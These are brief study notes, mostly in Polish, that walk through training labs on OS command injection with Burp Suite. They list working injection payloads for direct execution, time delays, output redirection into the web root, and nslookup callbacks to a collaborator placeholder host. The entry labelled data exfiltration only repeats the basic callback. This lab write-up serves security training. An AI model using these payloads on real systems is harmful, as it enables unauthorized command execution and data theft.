Do command injection Potrzebny jest input (value) w formularzu lub burp, URL.

W labach wszystko wstawiane w burp, żeby uniknąć filtrowania w przeglądarce

wszytskie payloady:
|whoami
||ping+-c+10+127.0.0.1
||whoami>/var/www/images/output.txt
||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN

<br><br>
<hr>
<br><br>
<h2>Lab: OS command injection, simple case</h2>

body
storeId=1|whoami

<br><br>
<hr>
<br><br>
<h2>Lab: Blind OS command injection with time delays</h2>

email=x||ping+-c+10+127.0.0.1||

<br><br>
<hr>
<br><br>
<h2>Lab: Blind OS command injection with output redirection</h2>

Modify the email parameter, changing it to:
email=||whoami>/var/www/images/output.txt||

Now use Burp Suite to intercept and modify the request that loads an image of a product.
Modify the filename parameter, changing the value to the name of the file you specified for the output of the injected command:

original:
/image?filename=31.jpg

attack:
/image?filename=output.txt

<br><br>
<hr>
<br><br>
<h2>Lab: Blind OS command injection with out-of-band interaction</h2>

email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN

<br><br>
<hr>
<br><br>
<h2>Lab: Blind OS command injection with out-of-band data exfiltration</h2>

email=||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
